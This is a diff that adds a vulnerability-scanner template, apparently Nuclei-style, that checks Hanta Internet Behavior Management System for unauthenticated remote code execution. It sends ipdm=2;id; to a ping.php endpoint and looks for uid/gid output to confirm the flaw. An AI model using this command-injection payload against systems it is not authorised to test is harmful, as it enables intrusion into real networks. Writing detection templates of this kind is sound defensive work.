@@ -1,0 +1,24 @@
+id: hanta-rce
+name: Hanta Internet Behavior Management System - Remote Code Execution
+severity: high
+confidence: confirmed
+description: Hanta Internet Behavior Management System is vulnerable to RCE.
+tags:
+- hanta
+- rce
+- unauth
+- vuln
+requests:
+- method: GET
+  path: /dgn/dgn_tools/ping.php?ipdm=2;id;
+  matchers:
+  - type: regex
+    regex:
+    - uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)
+  - type: header
+    words:
+    - text/html
+  - type: status
+    status:
+    - 200
+  condition: and
